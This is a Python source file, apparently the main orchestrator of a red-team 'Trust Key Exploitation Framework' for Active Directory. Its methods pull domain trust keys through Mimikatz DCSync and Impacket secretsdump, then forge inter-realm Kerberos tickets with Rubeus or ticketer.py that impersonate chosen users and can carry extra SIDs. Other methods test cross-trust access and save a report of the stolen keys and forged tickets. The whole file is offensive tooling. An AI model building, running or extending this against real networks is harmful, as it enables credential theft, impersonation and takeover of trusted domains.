"""
Trust Key Exploitation Framework
Main orchestrator for trust key extraction and exploitation
"""

from pathlib import Path
from typing import Optional, List, Dict, Any
import json
from datetime import datetime

from .models import (
    TrustKey,
    TrustRelationship,
    ForgedTicket,
    TrustType,
    KeyType,
)
from .extractors import MimikatzExtractor, SecretsdumpExtractor, get_available_extractors
from .forgers import RubeusForger, ImpacketForger, get_available_forgers
from .testers import TrustTester
from .guides import ExploitationGuide


class TrustKeyFramework:
    """
    Main framework for trust key extraction and exploitation
    Coordinates extractors, forgers, and testing
    """

    def __init__(
            self,
            output_dir: str = "trust_keys",
            verbose: bool = True
    ):
        """
        Initialize trust key framework

        Args:
            output_dir: Directory for output files
            verbose: Print status messages
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.verbose = verbose

        # Initialize components
        self.mimikatz_extractor = MimikatzExtractor(output_dir=output_dir, verbose=verbose)
        self.secretsdump_extractor = SecretsdumpExtractor(output_dir=output_dir, verbose=verbose)
        self.rubeus_forger = RubeusForger(output_dir=output_dir, verbose=verbose)
        self.impacket_forger = ImpacketForger(output_dir=output_dir, verbose=verbose)
        self.tester = TrustTester(verbose=verbose)
        self.guide_generator = ExploitationGuide(output_dir=output_dir, verbose=verbose)

        # State tracking
        self.trusts: Dict[str, TrustRelationship] = {}
        self.extracted_keys: List[TrustKey] = []
        self.forged_tickets: List[ForgedTicket] = []

        self.log("Trust Key Exploitation Framework initialized", "success")
        self.log(f"Output directory: {self.output_dir}")

    def log(self, message: str, level: str = "info") -> None:
        """Print status message"""
        if not self.verbose:
            return
        prefixes = {"info": "[*]", "success": "[+]", "error": "[-]", "warning": "[!]"}
        print(f"{prefixes.get(level, '[*]')} {message}")

    def extract_trust_key_mimikatz(
            self,
            source_domain: str,
            target_domain: str,
            username: str,
            password: str,
            dc_ip: Optional[str] = None
    ) -> List[TrustKey]:
        """
        Extract trust key using Mimikatz DCSync
        """
        keys = self.mimikatz_extractor.extract(
            source_domain, target_domain, username, password, dc_ip
        )
        self.extracted_keys.extend(keys)
        return keys

    def extract_trust_key_secretsdump(
            self,
            source_domain: str,
            target_domain: str,
            username: str,
            password: str,
            dc_ip: Optional[str] = None
    ) -> List[TrustKey]:
        """
        Extract trust key using Impacket secretsdump
        """
        keys = self.secretsdump_extractor.extract(
            source_domain, target_domain, username, password, dc_ip
        )
        self.extracted_keys.extend(keys)
        return keys

    def extract_all_trust_keys(
            self,
            source_domain: str,
            username: str,
            password: str,
            dc_ip: Optional[str] = None
    ) -> List[TrustKey]:
        """
        Extract ALL trust keys from a domain
        """
        keys = self.secretsdump_extractor.extract_all_trusts(
            source_domain, username, password, dc_ip
        )
        self.extracted_keys.extend(keys)
        return keys

    def forge_inter_realm_tgt_rubeus(
            self,
            trust_key: TrustKey,
            user_to_impersonate: str,
            user_sid: Optional[str] = None,
            extra_sids: Optional[List[str]] = None
    ) -> Optional[ForgedTicket]:
        """
        Forge inter-realm TGT using Rubeus
        """
        ticket = self.rubeus_forger.forge_inter_realm_tgt(
            trust_key, user_to_impersonate, user_sid, extra_sids
        )
        if ticket:
            self.forged_tickets.append(ticket)
        return ticket

    def forge_inter_realm_tgt_impacket(
            self,
            trust_key: TrustKey,
            user_to_impersonate: str,
            user_sid: Optional[str] = None,
            extra_sids: Optional[List[str]] = None
    ) -> Optional[ForgedTicket]:
        """
        Forge inter-realm TGT using Impacket ticketer.py
        """
        ticket = self.impacket_forger.forge_inter_realm_tgt(
            trust_key, user_to_impersonate, user_sid, extra_sids
        )
        if ticket:
            self.forged_tickets.append(ticket)
        return ticket

    def test_trust_authentication(
            self,
            source_domain: str,
            target_domain: str,
            username: str,
            password: str
    ) -> bool:
        """
        Test if authentication works across trust
        """
        results = self.tester.run_all_tests(
            source_domain, target_domain, username, password
        )

        # Return True if any test succeeded
        return any(r.result.value == "success" for r in results)

    def generate_exploitation_guide(
            self,
            source_domain: str,
            target_domain: str,
            trust_type: str
    ) -> None:
        """
        Generate and display exploitation guide
        """
        self.guide_generator.print_guide(source_domain, target_domain, trust_type)
        self.guide_generator.save_guide(source_domain, target_domain, trust_type)

    def print_quick_reference(self) -> None:
        """Print quick reference card"""
        ref = self.guide_generator.generate_quick_reference()
        print(ref)

    def list_available_tools(self) -> Dict[str, List[str]]:
        """
        List available extraction and forging tools
        """
        extractors = get_available_extractors()
        forgers = get_available_forgers()

        self.log("Available tools:")
        self.log(f"  Extractors: {', '.join(extractors.keys()) or 'None'}")
        self.log(f"  Forgers: {', '.join(forgers.keys()) or 'None'}")

        return {
            "extractors": list(extractors.keys()),
            "forgers": list(forgers.keys()),
        }

    def generate_report(self) -> Dict[str, Any]:
        """
        Generate comprehensive report
        """
        report = {
            "generated_at": datetime.now().isoformat(),
            "tool": "RT Trust Key Exploitation Framework",
            "version": "1.0.0",
            "summary": {
                "trusts_tracked": len(self.trusts),
                "keys_extracted": len(self.extracted_keys),
                "tickets_forged": len(self.forged_tickets),
            },
            "extracted_keys": [k.to_dict() for k in self.extracted_keys],
            "forged_tickets": [t.to_dict() for t in self.forged_tickets],
        }

        # Save report
        report_file = self.output_dir / "trust_key_report.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, default=str)

        self.log(f"Report saved to: {report_file}", "success")

        return report

    def register_trust(
            self,
            source_domain: str,
            target_domain: str,
            trust_type: TrustType,
            is_bidirectional: bool = False
    ) -> TrustRelationship:
        """
        Register a trust relationship for tracking
        """
        key = f"{source_domain.lower()}->{target_domain.lower()}"

        trust = TrustRelationship(
            source_domain=source_domain,
            target_domain=target_domain,
            trust_type=trust_type,
            is_bidirectional=is_bidirectional,
        )

        self.trusts[key] = trust
        self.log(f"Registered trust: {source_domain} -> {target_domain}")

        return trust